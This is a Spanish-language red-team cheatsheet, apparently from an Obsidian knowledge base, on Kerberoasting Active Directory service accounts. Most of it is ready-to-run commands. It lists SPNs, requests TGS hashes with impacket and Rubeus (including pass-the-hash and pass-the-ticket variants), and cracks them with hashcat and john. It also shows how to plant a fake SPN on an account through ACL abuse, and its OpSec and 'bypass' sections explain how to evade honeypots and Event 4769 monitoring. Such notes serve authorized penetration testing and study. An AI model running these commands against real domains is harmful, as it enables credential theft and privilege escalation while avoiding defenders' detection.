---
aliases:
  - Kerberos Kerberoasting
  - Kerberoast
  - SPN Roasting
tags:
  - type/atomic
  - technique/credential-access
  - technique/kerberos
  - env/windows
  - asset/active-directory
  - cred/kerberos
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
tertiary categories:
  - "[[Active Directory]]"
type: Atomic
linked:
  - "[[Active Directory Exploitation]]"
  - "[[Kerberos (88) - Enumeración]]"
  - "[[GetUserSPNs.py]]"
  - "[[AS-REP Roasting]]"
---
# Kerberoasting

***

## Cheatsheet
^kerberoasting

| Paso | Comando | Contexto |
| --- | --- | --- |
| **List SPNs** | `impacket-GetUserSPNs dom.local/user:pass -dc-ip DC` | Linux con creds |
| **Request TGS** | `impacket-GetUserSPNs dom.local/user:pass -dc-ip DC -request -outputfile hashes.txt` | Linux roast masivo |
| **Rubeus roast** | `Rubeus.exe kerberoast /outfile:hashes.txt` | Windows con sesión de dominio |
| **Targeted** | `Rubeus.exe kerberoast /user:svc_sql /outfile:h.txt` | Evitar ruido |
| **AES-only filter** | `Rubeus.exe kerberoast /aes` | Si cuentas tienen AES habilitado (hasta crackeable) |
| **Crack** | `hashcat -m 13100 hashes.txt rockyou.txt -O` | etype 23 (RC4-HMAC) |
| **Crack AES** | `hashcat -m 19700 hashes.txt rockyou.txt` | etype 18 (AES256) |

***

## Concepto

Cualquier user autenticado al dominio puede solicitar un TGS (Ticket-Granting Service) para cualquier SPN. El TGS se firma con la clave NT hash de la cuenta que "posee" ese SPN (service account).

Si esa service account tiene password débil/humana → crack offline del TGS → hash de la cuenta de servicio.

**Ruido bajo**: tráfico Kerberos normal. Solo detectable con eventos 4769 correlacionados y etype anómalo.

## Requisitos

- User cualquiera con creds válidas del dominio (no privilegiado).
- SPN set sobre cuenta de usuario (no sobre computer accounts — su hash es random 128 chars).
- Conectividad al DC (puerto 88 TCP/UDP).

## 1. Listar SPNs kerberoasteables

### Linux (impacket)
```bash
impacket-GetUserSPNs dom.local/user:pass -dc-ip 10.10.10.10
```

Solo usuarios con SPN:
```bash
impacket-GetUserSPNs dom.local/user:pass -dc-ip 10.10.10.10 | awk '{print $2}' | sort -u
```

### Windows (PowerView)
```powershell
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname
```

### Windows (nativo)
```powershell
setspn -Q */*
setspn -T dom.local -Q */*
```

### Con BloodHound
Query: `Kerberoastable Users`.

## 2. Solicitar TGS (roast)

### impacket (remote)
```bash
# Masivo
impacket-GetUserSPNs dom.local/user:pass -dc-ip 10.10.10.10 -request -outputfile hashes.txt

# Hash listo para hashcat modo 13100
cat hashes.txt
# $krb5tgs$23$*svc_sql$dom.local$MSSQLSvc/sqlsrv01.dom.local~1433*$abc...
```

### Rubeus (on-host)
```powershell
# Todos
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Target específico (menos ruido)
.\Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql.txt

# Formato john / hashcat explícito
.\Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt

# Via pass-the-ticket (si ya tenés TGT)
.\Rubeus.exe kerberoast /ticket:base64TGT
```

### Pass-the-hash roast
```bash
impacket-GetUserSPNs dom.local/user -hashes :NTHASH -dc-ip DC -request
```

## 3. Crack offline

```bash
# etype 23 (RC4-HMAC-MD5) — default, crack rápido
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -O

# etype 18 (AES256-CTS-HMAC-SHA1-96)
hashcat -m 19700 hashes.txt rockyou.txt

# etype 17 (AES128)
hashcat -m 19600 hashes.txt rockyou.txt

# Con rules
hashcat -m 13100 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John
john --format=krb5tgs --wordlist=rockyou.txt hashes.txt
```

## 4. Targeted Kerberoasting (abuso de ACL)

Con `WriteProperty` o `GenericAll` sobre una cuenta sin SPN:

```powershell
# Agregar SPN fake
Set-DomainObject -Identity victim_user -Set @{serviceprincipalname='fake/spn'}

# Roast
Rubeus.exe kerberoast /user:victim_user

# Limpiar SPN (opsec)
Set-DomainObject -Identity victim_user -Clear serviceprincipalname
```

## 5. Mitigaciones del blue team (y bypass)

| Control | Bypass |
| --- | --- |
| Password largo + complejo | Solo funciona para passwords humanos débiles |
| Managed Service Accounts (MSA/gMSA) | No kerberoasteables (hash random) |
| AES-only encryption | Más lento pero crackeable |
| Honeypot SPNs | Detección agresiva — evitar con target específico |
| Event 4769 monitoring | Usar targeted Kerberoasting, no mass roast |

***

## OpSec

- `Rubeus kerberoast /user:X` deja menos eventos 4769 que roast masivo.
- Filtrar AES-only reduce ruido de RC4 anómalo (Windows moderno usa AES default).
- Forzar RC4 con `/tgtdeleg` puede triggerear detección por etype downgrade.
- No solicitar TGS desde DC directamente.

## Recursos

- [HackTricks - Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)
- [Rubeus Wiki](https://github.com/GhostPack/Rubeus)
- [HarmJ0y - Kerberoasting](https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)

***
